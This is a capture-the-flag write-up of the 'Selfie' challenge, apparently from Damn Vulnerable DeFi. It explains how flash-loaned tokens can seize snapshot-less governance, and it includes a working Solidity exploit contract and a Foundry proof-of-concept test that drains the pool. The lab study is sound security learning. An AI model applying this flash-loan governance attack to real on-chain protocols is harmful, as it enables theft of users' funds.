# Selfie

## Challenge Overview

The `SelfiePool` contract is offering flash loans of DVT tokens. `SimpleGovernance` controls priviledged actions on the pool.

Starting with nothing, rescue the 1.5 million DVT tokens in the pool and send then to the recovery account.

## Vulnerability Analysis

`SelfiePool` offers a majority of its own governance token in a flash loan. 

`SimpleGovernance::queueAction` relies on current delegated voting power instead of a snapshot. 
This allows flash-loaned tokens to be used to gain temporary governance control within a single transaction.

## Exploit Strategy

The exploit requires a contract to recieve the flash loan, delegate itself governance votes, and queue `emergencyExit`. After the 2 day delay period, the action can be executed by anyone.

`SelfiePoolRecoverer` is used to perform the exploit and send the rescued tokens to the recovery account.


```solidity
contract SelfiePoolRecoverer is IERC3156FlashBorrower {
    SelfiePool public pool;
    SimpleGovernance public governance;
    address public recovery;
    uint256 public index;

    constructor(address _pool, address _governance, address _recovery) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        recovery = _recovery;
    }

    function onFlashLoan(
        address /* initiator */,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata /* data */
    ) external returns (bytes32) {
        bytes memory payload = abi.encodeWithSignature(
            "emergencyExit(address)",
            recovery
        );
        DamnValuableVotes(token).delegate(address(this));
        index = governance.getActionCounter();
        governance.queueAction(
            address(pool),
            0,
            payload
        );
        DamnValuableVotes(token).approve(address(pool), amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

## Proof of Concept

```solidity
function test_selfie() public checkSolvedByPlayer {
    SelfiePoolRecoverer recoverer = new SelfiePoolRecoverer(
        address(pool),
        address(governance),
        recovery
    );

    pool.flashLoan(
        IERC3156FlashBorrower(address(recoverer)),
        address(token),
        TOKENS_IN_POOL,
        ""
    );

    vm.warp(block.timestamp + governance.getActionDelay());
    governance.executeAction(recoverer.index());
}
```

## Result

Tokens held by the pool will be rescued and sent to the recovery account.

